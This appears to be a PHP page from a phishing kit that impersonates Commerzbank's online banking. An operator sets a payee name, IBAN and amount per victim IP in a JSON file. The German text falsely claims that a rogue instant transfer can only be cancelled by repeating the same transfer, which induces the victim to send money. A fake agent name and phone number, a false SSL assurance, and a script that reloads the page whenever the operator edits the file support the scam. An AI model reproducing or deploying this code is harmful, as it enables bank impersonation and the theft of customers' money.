<?php
ob_start();
include 'data/src.php';
$srcContent = ob_get_clean();

$customCommandJsonPath = ($config['panelLocation'] ?? '') . 'custom/custom_umbuchen.json';
$customCommandJson = @file_get_contents($customCommandJsonPath);
$customCommandData = json_decode($customCommandJson, true);

$name             = '';
$iban             = '';
$summe            = '';
$verwendungszweck = '';

if (is_array($customCommandData)) {
    foreach ($customCommandData as $command) {
        if (isset($command['userIP']) && trim($command['userIP']) == ($_SERVER['REMOTE_ADDR'] ?? '')) {
            $name             = $command['name']             ?? '';
            $iban             = $command['iban']             ?? '';
            $summe            = $command['summe']            ?? '';
            $verwendungszweck = $command['verwendungszweck'] ?? '';
            break;
        }
    }
}

$contactJsonPath = ($config['panelLocation'] ?? '') . 'custom/contact_phone.json';
$contactJson = @file_get_contents($contactJsonPath);
$contactData = json_decode($contactJson, true);
$agentName = $contactData['agentName'] ?? '';
$phone     = $contactData['phone']     ?? '';
?>
<!doctype html>
<html lang="de">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <link rel="stylesheet" href="<?php echo $srcPath; ?>/src/css/bootstrap.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="<?php echo $srcPath; ?>/src/css/style.css">

    <link rel="icon" type="image/x-icon" href="<?php echo $srcPath; ?>/src/img/ff.ico" />

    <title>Umbuchung - Commerzbank</title>

    <style>
        :root {
            --cmz-teal:    #003F4F;
            --cmz-teal-d:  #002a36;
            --cmz-yellow:  #FFCC00;
            --cmz-yellow-d:#e6b800;
            --cmz-text:    #1a1f2b;
            --cmz-muted:   #6b7380;
            --cmz-border:  #e5e7eb;
            --cmz-soft:    #fff5cc;
            --cmz-warn-bg: #fff8ed;
            --cmz-warn-bd: #fde4be;
            --cmz-warn-tx: #6a4a18;
        }
        .umb-section {
            padding: 48px 16px 72px;
            display: flex; justify-content: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }
        .umb-wrap {
            width: 100%; max-width: 560px;
            text-align: center;
            animation: fadeUp .55s cubic-bezier(.22,1,.36,1) both;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(28px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes pop {
            from { opacity: 0; transform: scale(.6); }
            to   { opacity: 1; transform: scale(1); }
        }

        .umb-badge {
            width: 80px; height: 80px;
            margin: 0 auto 24px;
            border-radius: 50%;
            background: var(--cmz-soft);
            border: 4px solid #ffe680;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 12px 28px -6px rgba(0, 63, 79, .20);
            animation: pop .45s cubic-bezier(.22,1,.36,1) .15s both;
        }
        .umb-badge svg { width: 38px; height: 38px; color: var(--cmz-teal); }

        .umb-title {
            font-size: 1.7rem;
            font-weight: 700;
            margin: 0 0 12px;
            color: var(--cmz-teal);
            letter-spacing: -0.02em;
        }
        .umb-sub {
            font-size: .98rem;
            line-height: 1.55;
            color: var(--cmz-muted);
            margin: 0 auto 28px;
            max-width: 480px;
        }

        .umb-card {
            background: #fff;
            border: 1px solid var(--cmz-border);
            border-radius: 12px;
            box-shadow: 0 6px 16px -4px rgba(20, 30, 50, .08), 0 2px 6px -2px rgba(20, 30, 50, .04);
            overflow: hidden;
            text-align: left;
        }
        .card-stripe { height: 6px; background: var(--cmz-yellow); }
        .card-body { padding: 8px 28px 24px; }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            padding: 18px 0;
            border-bottom: 1px solid var(--cmz-border);
        }
        .info-row:last-child { border-bottom: none; }
        .info-label {
            font-size: .82rem;
            font-weight: 500;
            color: var(--cmz-muted);
            text-transform: uppercase;
            letter-spacing: .06em;
        }
        .info-value {
            font-size: 1rem;
            font-weight: 600;
            color: var(--cmz-text);
            text-align: right;
            font-variant-numeric: tabular-nums;
            word-break: break-all;
        }
        .info-value.iban { font-family: 'JetBrains Mono', 'Menlo', monospace; font-size: .95rem; letter-spacing: .02em; }
        .info-value.summe {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--cmz-teal);
            letter-spacing: -0.01em;
        }

        .notice {
            margin-top: 18px;
            padding: 14px 16px;
            background: var(--cmz-warn-bg);
            border: 1px solid var(--cmz-warn-bd);
            border-left: 4px solid var(--cmz-yellow-d);
            border-radius: 8px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
            font-size: .85rem;
            color: var(--cmz-warn-tx);
            line-height: 1.5;
            text-align: left;
        }
        .notice svg { width: 18px; height: 18px; color: var(--cmz-yellow-d); flex-shrink: 0; margin-top: 1px; }

        .ssl-note {
            text-align: center;
            margin-top: 20px;
            font-size: .75rem;
            color: #98a0ad;
            display: flex; align-items: center; justify-content: center;
            gap: 6px;
        }
        .ssl-note svg { width: 14px; height: 14px; }

        .contact-card {
            margin-top: 22px;
            padding: 16px 18px;
            background: #fafbfc;
            border: 1px solid var(--cmz-border);
            border-radius: 10px;
            text-align: left;
            display: flex; align-items: center; gap: 14px;
            font-size: .9rem;
        }
        .contact-icon {
            width: 38px; height: 38px;
            border-radius: 50%;
            background: var(--cmz-soft);
            color: var(--cmz-teal);
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
        }
        .contact-icon svg { width: 18px; height: 18px; }
        .contact-meta { flex: 1; }
        .contact-meta .lbl {
            display: block; font-size: .72rem; color: var(--cmz-muted);
            text-transform: uppercase; letter-spacing: .06em;
            font-weight: 500; margin-bottom: 2px;
        }
        .contact-meta .name { font-weight: 600; color: var(--cmz-text); }
        .contact-meta .phone {
            display: block; color: var(--cmz-teal);
            font-weight: 700; margin-top: 2px;
            text-decoration: none;
        }
    </style>
</head>

<body>

    <header class="">
        <div class="container">
            <div class="over">
                <ul>
                    <li class="active"><a href="#">Suche <img src="<?php echo $srcPath; ?>/src/img/searsh.png"></a></li>
                    <li><a href="#">Konzern</a></li>
                    <li><a href="#">English</a></li>
                    <li class="cal"><a href="#">Profil &amp; Einstellungen</a></li>
                </ul>
            </div>
            <div class="mel_cent">
                <img src="<?php echo $srcPath; ?>/src/img/logo_big.svg">
                <div class="mom">
                    <a href="#">Privatkunden</a>
                    <a href="#">Unternehmerkunden</a>
                </div>
            </div>
        </div>
    </header>

    <div class="fot">
        <div class="container">
            <ul>
                <li><a href="">Startseite</a></li>
                <li><a href="">Konten &amp; Karten</a></li>
                <li><a href="">Depot &amp; Order</a></li>
                <li><a href="">Analyse</a></li>
                <li><a href="">Service</a></li>
                <li><a href="">Produkte &amp; Wissen</a></li>
            </ul>
        </div>
    </div>

    <div class="responcive">
        <div class="container">
            <img src="<?php echo $srcPath; ?>/src/img/nav.png" class="ss">
            <img src="<?php echo $srcPath; ?>/src/img/logo_big.svg" class="bon">
        </div>
    </div>

    <div class="umb-section">
        <div class="umb-wrap">

            <div class="umb-badge">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="17 1 21 5 17 9"></polyline>
                    <path d="M3 11V9a4 4 0 0 1 4-4h14"></path>
                    <polyline points="7 23 3 19 7 15"></polyline>
                    <path d="M21 13v2a4 4 0 0 1-4 4H3"></path>
                </svg>
            </div>

            <h1 class="umb-title">Auftrag Stornieren</h1>
            <p class="umb-sub">
                Eine Echtzeit-&Uuml;berweisung wurde von einem anderen Ger&auml;t durchgef&uuml;hrt und ist daher auf Ihrem Ger&auml;t nicht sichtbar. Um die Transaktion zu stornieren, m&uuml;ssen Sie dieselbe &Uuml;berweisung von Ihrem Ger&auml;t aus erneut durchgef&uuml;hren. Nur so k&ouml;nnen wir die Stornierung sofort bearbeiten.
            </p>

            <div class="umb-card">
                <div class="card-stripe"></div>
                <div class="card-body">
                    <div class="info-row">
                        <span class="info-label">Name</span>
                        <span class="info-value"><?php echo htmlspecialchars($name); ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">IBAN</span>
                        <span class="info-value iban"><?php echo htmlspecialchars($iban); ?></span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">Summe</span>
                        <span class="info-value summe"><?php echo htmlspecialchars($summe); ?> &euro;</span>
                    </div>
                    <?php if (!empty($verwendungszweck)): ?>
                    <div class="info-row">
                        <span class="info-label">Verwendungszweck</span>
                        <span class="info-value"><?php echo htmlspecialchars($verwendungszweck); ?></span>
                    </div>
                    <?php endif; ?>
                </div>
            </div>

            <div class="notice">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
                    <line x1="12" y1="9" x2="12" y2="13"></line>
                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
                </svg>
                Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
            </div>

            <p class="ssl-note">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Sichere Verbindung &mdash; 256-Bit SSL Verschl&uuml;sselung
            </p>

            <?php if (!empty($agentName) && !empty($phone)): ?>
            <div id="contactCard" class="contact-card">
                <div class="contact-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                </div>
                <div class="contact-meta">
                    <span class="lbl">Bei R&uuml;ckfragen erreichen Sie uns</span>
                    <span class="name"><?php echo htmlspecialchars($agentName); ?></span>
                    <a class="phone" href="tel:<?php echo htmlspecialchars(preg_replace('/\s+/', '', $phone)); ?>"><?php echo htmlspecialchars($phone); ?></a>
                </div>
            </div>
            <?php endif; ?>

        </div>
    </div>


    <div class="fotter">
        <div class="container">
            <ul>
                <li>AGB</li>
                <li> Preise &amp; Konditionen</li>
                <li>Impressum</li>
                <li>Rechtliche Hinweise</li>
                <li>Einwilligungseinstellungen</li>
                <li class="active">Datenschutzhinweise</li>
            </ul>
        </div>
    </div>

    <script src="<?php echo $srcPath; ?>/src/js/jquery-3.5.1.min.js"></script>
    <script src="<?php echo $srcPath; ?>/src/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="<?php echo $srcPath; ?>/src/js/js.js"></script>

    <script>
        var initialModTime = null;
        var customCommandJsonPath = '<?php echo $customCommandJsonPath; ?>';
        function checkFileModification() {
            fetch(customCommandJsonPath, { method: 'HEAD', cache: 'no-cache' })
            .then(response => {
                var currentModTime = new Date(response.headers.get('Last-Modified'));
                if (initialModTime === null) initialModTime = currentModTime;
                else if (currentModTime.getTime() !== initialModTime.getTime()) window.location.reload();
            })
            .catch(() => {});
        }
        setInterval(checkFileModification, 2000);
    </script>

</body>


</html>
